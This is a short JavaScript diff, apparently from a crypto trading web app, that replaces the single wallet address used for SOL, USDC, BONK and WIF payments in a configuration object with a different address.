@@ -896,10 +896,10 @@ async function sendCredentialsEmail(templateParams) {
             
             // Wallet addresses
             this.cryptoAddresses = {
-                sol: 'FPZMCySMfxxxswbw3BMmjYBNb6ETjrJktZVK469yTiG7',
-                usdc: 'FPZMCySMfxxxswbw3BMmjYBNb6ETjrJktZVK469yTiG7',
-                bonk: 'FPZMCySMfxxxswbw3BMmjYBNb6ETjrJktZVK469yTiG7',
-                wif: 'FPZMCySMfxxxswbw3BMmjYBNb6ETjrJktZVK469yTiG7'
+                sol: 'BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb',
+                usdc: 'BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb',
+                bonk: 'BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb',
+                wif: 'BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb'
             };
             
             // Watch trading variables
